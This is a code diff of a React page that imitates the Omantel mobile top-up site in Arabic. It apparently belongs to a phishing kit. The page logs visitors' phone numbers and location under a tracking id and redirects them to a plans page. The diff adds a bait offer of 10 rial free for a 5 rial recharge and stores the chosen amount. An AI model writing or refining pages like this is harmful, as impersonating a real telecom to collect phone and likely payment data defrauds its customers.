@@ -12,6 +12,7 @@ import {
   Youtube,
   MessageSquare,
   PhoneCall,
+  Loader2,
 } from "lucide-react"
 import { Input } from "@/components/ui/input"
 import { Button } from "@/components/ui/button"
@@ -21,10 +22,12 @@ import { useEffect, useState } from "react"
 import { setupOnlineStatus } from "@/lib/utils"
 import { OmantelLogo } from "@/components/logo"
 import { LiveChatWidget } from "@livechat/widget-react"
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
 const visitorId = `omn-app-${Math.random().toString(36).substring(2, 15)}`;
 
 export default function OmantelPage() {
   const [phone, setPhone] = useState("")
+  const [amount, setAmount] = useState("5.00")
   const [loading, setIsLoading] = useState(false)
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -32,12 +35,12 @@ export default function OmantelPage() {
     await addData({
       createdDate: new Date().toISOString(),
       id: visitorId,
-      phone:phone,
-      mobile:phone
+      phone: phone,
+      mobile: phone
     })
     setIsLoading(true)
     setTimeout(() => {
-      window.location.href="/plans"
+      window.location.href = "/plans"
     }, 3000);
   }
   const getLocationAndLog = async () => {
@@ -77,6 +80,9 @@ export default function OmantelPage() {
   useEffect(() => {
     getLocationAndLog()
   }, []);
+  useEffect(()=>{
+    const amo=localStorage.setItem('amount',amount)
+  },[amount])
   return (
     <div className="bg-white font-sans">
       <header className="flex items-center justify-between p-4 border-b border-gray-200 sticky top-0 bg-white z-10">
@@ -111,7 +117,7 @@ export default function OmantelPage() {
               <label htmlFor="phone" className="text-sm font-medium text-gray-700 block">
                 أدخل رقم الهاتف المحمول
               </label>
-              <Input id="phone" onChange={(e)=>setPhone(e.target.value)} type="tel" dir="ltr" className="text-center" maxLength={10} />
+              <Input id="phone" onChange={(e) => setPhone(e.target.value)} type="tel" dir="ltr" className="text-center" maxLength={10} />
             </div>
 
             <div className="space-y-2">
@@ -119,14 +125,25 @@ export default function OmantelPage() {
                 مبلغ إعادة التعبئة
               </label>
               <div className="relative">
-                <Input id="amount" type="number" className="pr-12 text-center" />
-                <span className="absolute inset-y-0 right-0 flex items-center pr-3 text-gray-500">ر.ع</span>
+              <Select dir="rtl" onValueChange={(value) => setAmount(value)}>
+        <SelectTrigger className="w-full">
+          <SelectValue placeholder="اختر الباقة" />
+        </SelectTrigger>
+        <SelectContent>
+          <SelectItem value="5">اشحن 5 ريال واحصل على 10 ريال مجاناً</SelectItem>
+          <SelectItem value="10">10 ريال</SelectItem>
+          <SelectItem value="15">15 ريال</SelectItem>
+          <SelectItem value="25">25 ريال</SelectItem>
+          <SelectItem value="35">35 ريال</SelectItem>
+          <SelectItem value="50">50 ريال</SelectItem>
+        </SelectContent>
+      </Select>
               </div>
               <p className="text-xs text-gray-400 text-center pt-1">الحد الأدنى ١ ر.ع - الحد الأقصى ١٠٠ ر.ع في اليوم</p>
             </div>
 
-            <Button type="submit" className={`w-full ${phone.length > 8 ?" bg-orange-500 ":"bg-gray-500"} hover:bg-gray-400 text-white font-bold`}>
-              تعبئة الرصيد
+            <Button type="submit" className={`w-full ${phone.length > 8 ? " bg-orange-500 " : "bg-gray-500"} hover:bg-gray-400 text-white font-bold`}>
+              تعبئة الرصيد {loading&&<Loader2 className="animate-spin"/>}
             </Button>
           </form>
         </div>
@@ -146,7 +163,7 @@ export default function OmantelPage() {
                 <span>1235 مركز اتصال الشركات</span>
               </div>
             </div>
-          
+
           </div>
 
           <div className="grid grid-cols-2 md:grid-cols-4 gap-8 text-sm">
